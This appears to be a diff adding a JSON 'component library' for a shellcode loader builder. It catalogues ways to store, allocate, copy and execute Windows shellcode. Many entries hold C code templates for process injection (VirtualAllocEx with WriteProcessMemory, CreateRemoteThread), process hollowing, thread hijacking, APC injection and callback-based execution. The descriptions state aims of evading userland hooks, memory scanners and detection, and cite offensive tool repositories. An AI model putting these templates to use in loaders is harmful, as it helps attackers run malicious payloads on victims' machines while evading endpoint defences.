@@ -1,0 +1,959 @@
+{
+  "version": "1.1",
+  "last_updated": "2026-03-20T11:44:52.478742",
+  "techniques": [],
+  "component_library": {
+    "storage_methods": [
+      {
+        "id": "embedded",
+        "name": "内部嵌入",
+        "description": "Shellcode直接编译到exe中",
+        "complexity": "simple"
+      },
+      {
+        "id": "resource",
+        "name": "资源段",
+        "description": "Shellcode存储在PE资源段",
+        "complexity": "simple"
+      },
+      {
+        "id": "remote_url",
+        "name": "远程URL",
+        "description": "从远程服务器下载",
+        "complexity": "medium",
+        "apis": [
+          "WinHttpOpen",
+          "WinHttpConnect",
+          "WinHttpOpenRequest",
+          "WinHttpSendRequest",
+          "WinHttpReceiveResponse",
+          "WinHttpReadData"
+        ]
+      },
+      {
+        "id": "local_file",
+        "name": "本地文件",
+        "description": "从本地文件读取",
+        "complexity": "simple",
+        "apis": [
+          "CreateFile",
+          "ReadFile",
+          "GetFileSize"
+        ]
+      },
+      {
+        "id": "encrypted_resource",
+        "name": "加密资源段",
+        "description": "加密后存储在资源段",
+        "complexity": "complex",
+        "apis": [
+          "FindResource",
+          "LoadResource",
+          "LockResource",
+          "SizeofResource"
+        ]
+      },
+      {
+        "id": "uuid_encoded",
+        "name": "UUID编码",
+        "description": "将shellcode编码为UUID字符串格式",
+        "complexity": "medium",
+        "apis": [
+          "UuidFromStringA"
+        ]
+      },
+      {
+        "id": "ipv4_encoded",
+        "name": "IPv4编码",
+        "description": "将shellcode编码为IPv4地址格式",
+        "complexity": "medium",
+        "apis": [
+          "inet_pton"
+        ]
+      },
+      {
+        "id": "base64_encoded",
+        "name": "Base64编码",
+        "description": "Base64编码存储shellcode",
+        "complexity": "simple",
+        "apis": [
+          "CryptStringToBinaryA"
+        ]
+      },
+      {
+        "name": "Registry存储",
+        "description": "将shellcode存储在Windows注册表中",
+        "complexity": "medium",
+        "apis": [
+          "RegOpenKeyEx",
+          "RegSetValueEx",
+          "RegQueryValueEx"
+        ],
+        "id": "sto_009"
+      },
+      {
+        "name": "远程URL下载",
+        "description": "从远程服务器下载shellcode，支持分段加载",
+        "complexity": "medium",
+        "apis": [
+          "InternetOpenA",
+          "InternetConnectA",
+          "HttpOpenRequestA",
+          "HttpSendRequestA",
+          "InternetReadFile"
+        ],
+        "id": "sto_010",
+        "source": "github: chainski/PandaLoader, tehstoni/tryharder"
+      },
+      {
+        "name": "Word List Encoding",
+        "description": "Encode shellcode as English words/wordlist for low entropy evasion",
+        "complexity": "medium",
+        "id": "sto_011"
+      },
+      {
+        "name": "MAC Address Encoding",
+        "description": "Encode shellcode as MAC address format strings (XX:XX:XX:XX:XX:XX)",
+        "complexity": "medium",
+        "apis": [
+          "RtlEthernetStringToAddressA"
+        ],
+        "id": "sto_012"
+      },
+      {
+        "name": "RSA Encrypted",
+        "description": "RSA encryption for shellcode, uses public key cryptography for payload protection",
+        "complexity": "complex",
+        "apis": [
+          "CryptAcquireContext",
+          "CryptImportKey",
+          "CryptDecrypt"
+        ],
+        "id": "sto_013"
+      },
+      {
+        "name": "Resource Encrypted",
+        "description": "Store encrypted shellcode in PE resource section (RT_RCDATA), decrypt at runtime",
+        "complexity": "medium",
+        "apis": [
+          "FindResource",
+          "LoadResource",
+          "LockResource",
+          "SizeofResource"
+        ],
+        "id": "sto_014"
+      },
+      {
+        "name": "Huffman Encoded",
+        "description": "使用Huffman编码压缩存储shellcode，减小体积并增加混淆",
+        "complexity": "complex",
+        "references": [
+          "https://github.com/0xHossam/HuffLoader"
+        ],
+        "id": "sto_015"
+      }
+    ],
+    "memory_allocators": [
+      {
+        "id": "VirtualAlloc",
+        "name": "VirtualAlloc",
+        "description": "标准Windows内存分配",
+        "apis": [
+          "VirtualAlloc",
+          "VirtualFree"
+        ],
+        "complexity": "simple",
+        "code_template": "LPVOID addr = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\nmemcpy(addr, shellcode, size);\nVirtualProtect(addr, size, PAGE_EXECUTE_READ, &oldProtect);"
+      },
+      {
+        "id": "HeapCreate",
+        "name": "HeapCreate",
+        "description": "在堆上分配可执行内存",
+        "apis": [
+          "HeapCreate",
+          "HeapAlloc",
+          "HeapDestroy"
+        ],
+        "complexity": "medium",
+        "code_template": "HANDLE hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);\nLPVOID addr = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, size);\nmemcpy(addr, shellcode, size);"
+      },
+      {
+        "id": "NtAllocateVirtualMemory",
+        "name": "NtAllocateVirtualMemory",
+        "description": "使用NTDLL底层API分配内存",
+        "apis": [
+          "NtAllocateVirtualMemory",
+          "NtProtectVirtualMemory"
+        ],
+        "complexity": "complex",
+        "code_template": "PVOID addr = NULL;\nSIZE_T regionSize = size;\nNtAllocateVirtualMemory(GetCurrentProcess(), &addr, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\nmemcpy(addr, shellcode, size);\nNtProtectVirtualMemory(GetCurrentProcess(), &addr, &regionSize, PAGE_EXECUTE_READ, &oldProtect);"
+      },
+      {
+        "id": "MappedFile",
+        "name": "内存映射文件",
+        "description": "通过文件映射申请内存",
+        "apis": [
+          "CreateFileMapping",
+          "MapViewOfFile"
+        ],
+        "complexity": "medium",
+        "code_template": "HANDLE hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, size, NULL);\nLPVOID addr = MapViewOfFile(hMapping, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0, 0, 0);\nmemcpy(addr, shellcode, size);"
+      },
+      {
+        "id": "VirtualAllocEx",
+        "name": "VirtualAllocEx",
+        "description": "在目标进程中分配内存(注入)",
+        "apis": [
+          "OpenProcess",
+          "VirtualAllocEx",
+          "WriteProcessMemory"
+        ],
+        "complexity": "complex",
+        "code_template": "HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);\nLPVOID addr = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\nWriteProcessMemory(hProcess, addr, shellcode, size, NULL);\nVirtualProtectEx(hProcess, addr, size, PAGE_EXECUTE_READ, &oldProtect);"
+      },
+      {
+        "name": "NtMapViewOfSection",
+        "description": "使用Section对象映射内存，跨进程共享内存",
+        "complexity": "complex",
+        "apis": [
+          "NtCreateSection",
+          "NtMapViewOfSection",
+          "NtUnmapViewOfSection"
+        ],
+        "id": "mem_006"
+      },
+      {
+        "name": "Section Mapping",
+        "description": "Use NtCreateSection and NtMapViewOfSection to allocate executable memory via section objects",
+        "complexity": "complex",
+        "apis": [
+          "NtCreateSection",
+          "NtMapViewOfSection",
+          "NtUnmapViewOfSection"
+        ],
+        "id": "mem_007"
+      },
+      {
+        "name": "VirtualAlloc",
+        "description": "Standard Windows API for allocating executable memory. Allocates RWX memory pages for shellcode storage.",
+        "complexity": "simple",
+        "apis": [
+          "VirtualAlloc",
+          "VirtualProtect"
+        ],
+        "references": [
+          "https://github.com/b1nhack/rust-shellcode"
+        ],
+        "id": "mem_008"
+      },
+      {
+        "name": "NtAllocateVirtualMemory",
+        "description": "Native NT API for memory allocation. Direct syscall bypasses userland hooks.",
+        "complexity": "medium",
+        "apis": [
+          "NtAllocateVirtualMemory",
+          "NtProtectVirtualMemory"
+        ],
+        "references": [
+          "https://github.com/f1zm0/hades"
+        ],
+        "id": "mem_009"
+      },
+      {
+        "name": "HeapAlloc",
+        "description": "Heap-based memory allocation using process heap. Alternative to VirtualAlloc for shellcode storage.",
+        "complexity": "simple",
+        "apis": [
+          "HeapAlloc",
+          "GetProcessHeap"
+        ],
+        "id": "mem_010"
+      },
+      {
+        "name": "LargePageAllocation",
+        "description": "Allocate memory using large pages (2MB+). Can bypass some memory scanners due to different page attributes.",
+        "complexity": "high",
+        "apis": [
+          "AllocateLargePages",
+          "VirtualAlloc",
+          "LargePageMinimum"
+        ],
+        "references": [
+          "https://github.com/cpu0x00/Ghost"
+        ],
+        "id": "mem_011"
+      },
+      {
+        "name": "DripLoader Delayed Allocation",
+        "description": "延迟内存分配和提交，逐页注入shellcode，模拟正常内存行为以绕过事件检测",
+        "complexity": "complex",
+        "apis": [
+          "NtAllocateVirtualMemory"
+        ],
+        "references": [
+          "https://github.com/xuanxuan0/DripLoader"
+        ],
+        "id": "mem_012"
+      },
+      {
+        "name": "Indirect Syscall Allocator",
+        "description": "使用间接系统调用分配内存，避免用户态Hook",
+        "complexity": "complex",
+        "apis": [
+          "NtAllocateVirtualMemory"
+        ],
+        "references": [
+          "https://github.com/f1zm0/hades"
+        ],
+        "id": "mem_013"
+      },
+      {
+        "name": "Mockingjay Allocator",
+        "description": "利用具有RWX权限的系统DLL进行分配，无需调用VirtualAlloc",
+        "complexity": "complex",
+        "apis": [
+          "None"
+        ],
+        "references": [
+          "https://github.com/caueb/Mockingjay"
+        ],
+        "id": "mem_014"
+      }
+    ],
+    "data_copiers": [
+      {
+        "id": "memcpy",
+        "name": "memcpy",
+        "description": "标准C内存复制",
+        "complexity": "simple",
+        "code_template": "memcpy(dest, src, size);"
+      },
+      {
+        "id": "RtlMoveMemory",
+        "name": "RtlMoveMemory",
+        "description": "Windows API内存复制",
+        "apis": [
+          "RtlMoveMemory"
+        ],
+        "complexity": "simple",
+        "code_template": "RtlMoveMemory(dest, src, size);"
+      },
+      {
+        "id": "loop_copy",
+        "name": "循环字节复制",
+        "description": "逐字节复制，可用于解密同时复制",
+        "complexity": "simple",
+        "code_template": "for (size_t i = 0; i < size; i++) {\n    dest[i] = src[i] ^ key[i % keyLen]; // XOR解密示例\n}"
+      },
+      {
+        "id": "NtWriteVirtualMemory",
+        "name": "NtWriteVirtualMemory",
+        "description": "使用syscall写入内存",
+        "apis": [
+          "NtWriteVirtualMemory"
+        ],
+        "complexity": "complex",
+        "code_template": "SIZE_T bytesWritten;\nNtWriteVirtualMemory(hProcess, dest, src, size, &bytesWritten);"
+      },
+      {
+        "name": "RtlCopyMemory",
+        "description": "Windows kernel-mode compatible memory copy function",
+        "complexity": "simple",
+        "apis": [
+          "RtlCopyMemory"
+        ],
+        "id": "dat_005"
+      },
+      {
+        "name": "RtlCopyMemory",
+        "description": "Native NT API for memory copy operations. Equivalent to memcpy but uses NT API.",
+        "complexity": "simple",
+        "apis": [
+          "RtlCopyMemory"
+        ],
+        "references": [
+          "https://github.com/D3Ext/Hooka"
+        ],
+        "id": "dat_006"
+      },
+      {
+        "name": "NtWriteVirtualMemory",
+        "description": "Native NT API for writing to memory. Can write to local or remote process memory.",
+        "complexity": "medium",
+        "apis": [
+          "NtWriteVirtualMemory"
+        ],
+        "references": [
+          "https://github.com/f1zm0/hades"
+        ],
+        "id": "dat_007"
+      },
+      {
+        "name": "WriteProcessMemory",
+        "description": "Standard Windows API for writing to process memory.",
+        "complexity": "simple",
+        "apis": [
+          "WriteProcessMemory"
+        ],
+        "id": "dat_008"
+      },
+      {
+        "name": "Indirect Syscall Copier",
+        "description": "使用间接系统调用写入内存，避免用户态Hook",
+        "complexity": "complex",
+        "apis": [
+          "NtWriteVirtualMemory"
+        ],
+        "references": [
+          "https://github.com/f1zm0/hades"
+        ],
+        "id": "dat_009"
+      }
+    ],
+    "executors": [
+      {
+        "id": "function_pointer",
+        "name": "函数指针",
+        "description": "直接转换为函数指针调用",
+        "complexity": "simple",
+        "code_template": "((void(*)())addr)();"
+      },
+      {
+        "id": "CreateThread",
+        "name": "CreateThread",
+        "description": "创建新线程执行",
+        "apis": [
+          "CreateThread",
+          "WaitForSingleObject"
+        ],
+        "complexity": "simple",
+        "code_template": "HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);\nWaitForSingleObject(hThread, INFINITE);"
+      },
+      {
+        "id": "callback_enumwindows",
+        "name": "EnumWindows回调",
+        "description": "通过EnumWindows回调执行",
+        "apis": [
+          "EnumWindows"
+        ],
+        "complexity": "medium",
+        "code_template": "EnumWindows((WNDENUMPROC)addr, NULL);"
+      },
+      {
+        "id": "callback_enumchildwindows",
+        "name": "EnumChildWindows回调",
+        "description": "通过EnumChildWindows回调执行",
+        "apis": [
+          "EnumChildWindows",
+          "GetDesktopWindow"
+        ],
+        "complexity": "medium",
+        "code_template": "EnumChildWindows(GetDesktopWindow(), (WNDENUMPROC)addr, NULL);"
+      },
+      {
+        "id": "APC",
+        "name": "APC队列",
+        "description": "通过APC队列执行(需挂起线程)",
+        "apis": [
+          "QueueUserAPC",
+          "SleepEx"
+        ],
+        "complexity": "medium",
+        "code_template": "QueueUserAPC((PAPCFUNC)addr, GetCurrentThread(), 0);\nSleepEx(0, TRUE);"
+      },
+      {
+        "id": "APC_injection",
+        "name": "APC注入",
+        "description": "通过APC注入到挂起进程",
+        "apis": [
+          "CreateProcess",
+          "QueueUserAPC",
+          "ResumeThread"
+        ],
+        "complexity": "complex",
+        "code_template": "STARTUPINFO si = { sizeof(si) };\nPROCESS_INFORMATION pi;\nCreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);\nQueueUserAPC((PAPCFUNC)addr, pi.hThread, 0);\nResumeThread(pi.hThread);"
+      },
+      {
+        "id": "Fiber",
+        "name": "Fiber",
+        "description": "通过Fiber切换执行",
+        "apis": [
+          "ConvertThreadToFiber",
+          "CreateFiber",
+          "SwitchToFiber"
+        ],
+        "complexity": "medium",
+        "code_template": "ConvertThreadToFiber(NULL);\nLPVOID fiber = CreateFiber(0, (LPFIBER_START_ROUTINE)addr, NULL);\nSwitchToFiber(fiber);"
+      },
+      {
+        "id": "CreateRemoteThread",
+        "name": "CreateRemoteThread",
+        "description": "在目标进程中创建远程线程",
+        "apis": [
+          "CreateRemoteThread",
+          "OpenProcess"
+        ],
+        "complexity": "complex",
+        "code_template": "HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);\nHANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);"
+      },
+      {
+        "id": "SetThreadContext",
+        "name": "SetThreadContext",
+        "description": "修改线程上下文执行(进程镂空)",
+        "apis": [
+          "CreateProcess",
+          "GetThreadContext",
+          "SetThreadContext",
+          "ResumeThread"
+        ],
+        "complexity": "complex",
+        "code_template": "// Process hollowing variant\nCreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);\nCONTEXT ctx = { .ContextFlags = CONTEXT_FULL };\nGetThreadContext(pi.hThread, &ctx);\n// Modify RIP to point to shellcode\nctx.Rip = (DWORD64)addr;\nSetThreadContext(pi.hThread, &ctx);\nResumeThread(pi.hThread);"
+      },
+      {
+        "id": "callback_timer",
+        "name": "Timer回调",
+        "description": "通过SetTimer回调执行shellcode",
+        "apis": [
+          "SetTimer",
+          "MsgWaitForMultipleObjects"
+        ],
+        "complexity": "medium",
+        "code_template": "SetTimer(NULL, 0, 0, (TIMERPROC)addr);\nMsgWaitForMultipleObjects(0, NULL, FALSE, 100, QS_ALLINPUT);"
+      },
+      {
+        "id": "callback_enumdesktops",
+        "name": "EnumDesktopsW回调",
+        "description": "通过EnumDesktopsW回调执行",
+        "apis": [
+          "EnumDesktopsW",
+          "GetThreadDesktop"
+        ],
+        "complexity": "medium",
+        "code_template": "EnumDesktopsW(GetThreadDesktop(GetCurrentThreadId()), (DESKTOPENUMPROCW)addr, NULL);"
+      },
+      {
+        "id": "thread_hijacking",
+        "name": "线程劫持",
+        "description": "劫持现有线程执行shellcode",
+        "apis": [
+          "OpenThread",
+          "SuspendThread",
+          "GetThreadContext",
+          "SetThreadContext",
+          "ResumeThread"
+        ],
+        "complexity": "complex",
+        "code_template": "HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadId);\nSuspendThread(hThread);\nCONTEXT ctx = { .ContextFlags = CONTEXT_FULL };\nGetThreadContext(hThread, &ctx);\nctx.Rip = (DWORD64)addr;\nSetThreadContext(hThread, &ctx);\nResumeThread(hThread);"
+      },
+      {
+        "id": "NtCreateThreadEx",
+        "name": "NtCreateThreadEx",
+        "description": "使用NTDLL底层API创建线程",
+        "apis": [
+          "NtCreateThreadEx"
+        ],
+        "complexity": "complex",
+        "code_template": "typedef NTSTATUS (NTAPI* pNtCreateThreadEx)(\n    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE,\n    LPTHREAD_START_ROUTINE, PVOID, ULONG, ULONG, ULONG, ULONG, PVOID);\npNtCreateThreadEx NtCTE = (pNtCreateThreadEx)GetProcAddress(\n    GetModuleHandleA(\"ntdll.dll\"), \"NtCreateThreadEx\");\nHANDLE hThread;\nNtCTE(&hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(),\n    (LPTHREAD_START_ROUTINE)addr, NULL, FALSE, 0, 0, 0, NULL);"
+      },
+      {
+        "name": "CertEnumSystemStore回调",
+        "description": "通过证书存储枚举回调执行shellcode",
+        "complexity": "medium",
+        "apis": [
+          "CertEnumSystemStore",
+          "CertOpenStore"
+        ],
+        "id": "exe_014"
+      },
+      {
+        "name": "CopyFileEx回调",
+        "description": "通过CopyFileEx的进度回调执行shellcode",
+        "complexity": "medium",
+        "apis": [
+          "CopyFileEx",
+          "CancelIo"
+        ],
+        "id": "exe_015"
+      },
+      {
+        "name": "CreateThreadPoolWait回调",
+        "description": "通过线程池等待对象的回调执行shellcode",
+        "complexity": "medium",
+        "apis": [
+          "CreateThreadpoolWait",
+          "SetThreadpoolWait",
+          "WaitForThreadpoolWaitCallbacks"
+        ],
+        "id": "exe_016"
+      },
+      {
+        "name": "CreateTimerQueueTimer回调",
+        "description": "通过定时器队列定时器回调执行shellcode",
+        "complexity": "medium",
+        "apis": [
+          "CreateTimerQueue",
+          "CreateTimerQueueTimer",
+          "DeleteTimerQueue"
+        ],
+        "id": "exe_017",
+        "source": "github: aahmad097/AlternativeShellcodeExec"
+      },
+      {
+        "name": "CryptEnumOIDInfo回调",
+        "description": "通过加密对象标识符枚举回调执行shellcode",
+        "complexity": "medium",
+        "apis": [
+          "CryptEnumOIDInfo"
+        ],
+        "id": "exe_018",
+        "source": "github: aahmad097/AlternativeShellcodeExec"
+      },
+      {
+        "name": "EnumCalendarInfo回调",
+        "description": "通过日历信息枚举回调执行shellcode",
+        "complexity": "medium",
+        "apis": [
+          "EnumCalendarInfo",
+          "EnumCalendarInfoEx"
+        ],
+        "id": "exe_019",
+        "source": "github: aahmad097/AlternativeShellcodeExec"
+      },
+      {
+        "name": "EnumDisplayMonitors回调",
+        "description": "通过显示器枚举回调执行shellcode",
+        "complexity": "medium",
+        "apis": [
+          "EnumDisplayMonitors",
+          "GetMonitorInfo"
+        ],
+        "id": "exe_020",
+        "source": "github: aahmad097/AlternativeShellcodeExec"
+      },
+      {
+        "name": "EnumFontFamilies回调",
+        "description": "通过字体族枚举回调执行shellcode",
+        "complexity": "medium",
+        "apis": [
+          "EnumFontFamiliesW",
+          "EnumFontFamiliesExW"
+        ],
+        "id": "exe_021",
+        "source": "github: aahmad097/AlternativeShellcodeExec"
+      },
+      {
+        "name": "FlsAlloc回调",
+        "description": "通过Fiber本地存储分配回调执行shellcode",
+        "complexity": "medium",
+        "apis": [
+          "FlsAlloc",
+          "FlsSetValue"
+        ],
+        "id": "exe_022",
+        "source": "github: aahmad097/AlternativeShellcodeExec"
+      },
+      {
+        "name": "ImageGetDigestStream回调",
+        "description": "通过图像摘要流回调执行shellcode",
+        "complexity": "medium",
+        "apis": [
+          "ImageGetDigestStream"
+        ],
+        "id": "exe_023",
+        "source": "github: aahmad097/AlternativeShellcodeExec"
+      },
+      {
+        "name": "SetupCommitFileQueueW回调",
+        "description": "通过安装文件队列提交回调执行shellcode",
+        "complexity": "medium",
+        "apis": [
+          "SetupOpenFileQueue",
+          "SetupCommitFileQueueW"
+        ],
+        "id": "exe_024",
+        "source": "github: aahmad097/AlternativeShellcodeExec"
+      },
+      {
+        "name": "EtwpCreateEtwThread Execution",
+        "description": "Execute shellcode via ETW (Event Tracing for Windows) thread creation callback",
+        "complexity": "complex",
+        "apis": [
+          "EtwpCreateEtwThread"
+        ],
+        "id": "exe_025"
+      },
+      {
+        "name": "RtlCreateUserThread Execution",
+        "description": "Execute shellcode via RtlCreateUserThread native API, creating thread in target process without CreateRemoteThread",
+        "complexity": "complex",
+        "apis": [
+          "RtlCreateUserThread"
+        ],
+        "id": "exe_026"
+      },
+      {
+        "name": "LdrEnumerateLoadedModules Callback",
+        "description": "Execute shellcode via LdrEnumerateLoadedModules native API callback",
+        "complexity": "complex",
+        "apis": [
+          "LdrEnumerateLoadedModules"
+        ],
+        "id": "exe_027"
+      },
+      {
+        "name": "InitOnceExecuteOnce Callback",
+        "description": "Execute shellcode via one-time initialization callback mechanism",
+        "complexity": "medium",
+        "apis": [
+          "InitOnceExecuteOnce"
+        ],
+        "id": "exe_028"
+      },
+      {
+        "name": "CreateThread",
+        "description": "Standard Windows API to create a new thread for shellcode execution. Basic execution method.",
+        "complexity": "simple",
+        "apis": [
+          "CreateThread",
+          "WaitForSingleObject"
+        ],
+        "references": [
+          "https://github.com/b1nhack/rust-shellcode"
+        ],
+        "id": "exe_029"
+      },
+      {
+        "name": "CreateRemoteThread",
+        "description": "Create thread in remote process for process injection. Classic cross-process execution technique.",
+        "complexity": "medium",
+        "apis": [
+          "CreateRemoteThread",
+          "OpenProcess"
+        ],
+        "references": [
+          "https://github.com/b1nhack/rust-shellcode"
+        ],
+        "id": "exe_030"
+      },
+      {
+        "name": "EarlyBird_APC",
+        "description": "Queue APC to suspended process thread. Inject into process before it starts. Also known as process hollowing variant.",
+        "complexity": "medium",
+        "apis": [
+          "CreateProcessA",
+          "QueueUserAPC",
+          "ResumeThread",
+          "VirtualAllocEx",
+          "WriteProcessMemory"
+        ],
+        "references": [
+          "https://github.com/b1nhack/rust-shellcode"
+        ],
+        "id": "exe_031"
+      },
+      {
+        "name": "Fibers",
+        "description": "Convert thread to fiber and execute shellcode via fiber switching. Alternative execution path avoiding CreateThread.",
+        "complexity": "medium",
+        "apis": [
+          "ConvertThreadToFiber",
+          "CreateFiber",
+          "SwitchToFiber"
+        ],
+        "references": [
+          "https://github.com/b1nhack/rust-shellcode",
+          "https://github.com/D3Ext/Hooka"
+        ],
+        "id": "exe_032"
+      },
+      {
+        "name": "NtQueueApcThreadEx_Local",
+        "description": "Local APC queue execution using NtQueueApcThreadEx syscall. Execute in current process without CreateThread.",
+        "complexity": "medium",
+        "apis": [
+          "NtQueueApcThreadEx",
+          "GetCurrentThread"
+        ],
+        "references": [
+          "https://github.com/b1nhack/rust-shellcode"
+        ],
+        "id": "exe_033"
+      },
+      {
+        "name": "EtwpCreateEtwThread",
+        "description": "Undocumented NT API for creating ETW threads. Alternative thread creation method.",
+        "complexity": "high",
+        "apis": [
+          "EtwpCreateEtwThread"
+        ],
+        "references": [
+          "https://github.com/b1nhack/rust-shellcode",
+          "https://github.com/matro7sh/myph"
+        ],
+        "id": "exe_034"
+      },
+      {
+        "name": "NtCreateThreadEx",
+        "description": "Native NT API for thread creation. Direct syscall for thread creation bypassing userland hooks.",
+        "complexity": "medium",
+        "apis": [
+          "NtCreateThreadEx"
+        ],
+        "references": [
+          "https://github.com/f1zm0/hades"
+        ],
+        "id": "exe_035"
+      },
+      {
+        "name": "EnumSystemLocales_Callback",
+        "description": "Callback-based execution using EnumSystemLocalesEx. Shellcode executed as callback function.",
+        "complexity": "medium",
+        "apis": [
+          "EnumSystemLocalesEx"
+        ],
+        "references": [
+          "https://github.com/D3Ext/Hooka"
+        ],
+        "id": "exe_036"
+      },
+      {
+        "name": "SetTimer_Callback",
+        "description": "Callback-based execution using Windows Timer. Shellcode executed via timer callback.",
+        "complexity": "medium",
+        "apis": [
+          "SetTimer",
+          "GetMessageW",
+          "DispatchMessageW"
+        ],
+        "references": [
+          "https://github.com/matro7sh/myph"
+        ],
+        "id": "exe_037"
+      },
+      {
+        "name": "ModuleStomping",
+        "description": "Overwrite entry point of legitimate DLL in remote process. Execute shellcode from existing module context.",
+        "complexity": "high",
+        "apis": [
+          "EnumProcessModules",
+          "GetModuleBaseNameA",
+          "ReadProcessMemory",
+          "WriteProcessMemory"
+        ],
+        "references": [
+          "https://github.com/b1nhack/rust-shellcode"
+        ],
+        "id": "exe_038"
+      },
+      {
+        "name": "RtlCreateUserThread",
+        "description": "Native NT API wrapper for creating user mode threads. Alternative to CreateRemoteThread.",
+        "complexity": "medium",
+        "apis": [
+          "RtlCreateUserThread"
+        ],
+        "id": "exe_039"
+      },
+      {
+        "name": "EnumChildWindows Callback",
+        "description": "通过EnumChildWindows回调函数执行shellcode，避免CreateThread调用",
+        "complexity": "medium",
+        "apis": [
+          "EnumChildWindows"
+        ],
+        "references": [
+          "https://github.com/ChaitanyaHaritash/Callback_Shellcode_Injection"
+        ],
+        "id": "exe_040"
+      },
+      {
+        "name": "EnumDateFormats Callback",
+        "description": "通过EnumDateFormats回调函数执行shellcode",
+        "complexity": "medium",
+        "apis": [
+          "EnumDateFormatsA",
+          "EnumDateFormatsW"
+        ],
+        "references": [
+          "https://github.com/ChaitanyaHaritash/Callback_Shellcode_Injection"
+        ],
+        "id": "exe_041"
+      },
+      {
+        "name": "EnumDesktopWindows Callback",
+        "description": "通过EnumDesktopWindows回调函数执行shellcode",
+        "complexity": "medium",
+        "apis": [
+          "EnumDesktopWindows"
+        ],
+        "references": [
+          "https://github.com/ChaitanyaHaritash/Callback_Shellcode_Injection"
+        ],
+        "id": "exe_042"
+      },
+      {
+        "name": "EnumSystemLocales Callback",
+        "description": "通过EnumSystemLocales回调函数执行shellcode",
+        "complexity": "medium",
+        "apis": [
+          "EnumSystemLocalesA",
+          "EnumSystemLocalesW"
+        ],
+        "references": [
+          "https://github.com/ChaitanyaHaritash/Callback_Shellcode_Injection"
+        ],
+        "id": "exe_043"
+      },
+      {
+        "name": "Indirect Syscall Executor",
+        "description": "通过间接系统调用创建线程执行shellcode，跳转到NTDLL中的syscall指令",
+        "complexity": "complex",
+        "apis": [
+          "NtCreateThreadEx"
+        ],
+        "references": [
+          "https://github.com/VirtualAlllocEx/Direct-Syscalls-vs-Indirect-Syscalls"
+        ],
+        "id": "exe_044"
+      },
+      {
+        "name": "Fiber Executor",
+        "description": "通过Windows Fiber机制执行shellcode，创建协程上下文",
+        "complexity": "medium",
+        "apis": [
+          "ConvertThreadToFiber",
+          "CreateFiber",
+          "SwitchToFiber"
+        ],
+        "id": "exe_045"
+      },
+      {
+        "name": "Module Stomping Executor",
+        "description": "覆盖合法DLL模块的.text段来执行shellcode，无需创建新线程",
+        "complexity": "complex",
+        "apis": [
+          "LoadLibrary",
+          "VirtualProtect"
+        ],
+        "references": [
+          "https://github.com/WithSecureLabs/ModuleStomping",
+          "https://github.com/BlackSnufkin/NovaLdr"
+        ],
+        "id": "exe_046"
+      },
+      {
+        "name": "VEH Exception Handler",
+        "description": "通过向量化异常处理器执行shellcode，触发异常后捕获执行",
+        "complexity": "medium",
+        "apis": [
+          "AddVectoredExceptionHandler",
+          "RaiseException"
+        ],
+        "references": [
+          "https://github.com/zack0x5/VEH-Shellcode-Execution"
+        ],
+        "id": "exe_047"
+      }
+    ]
+  }
+}
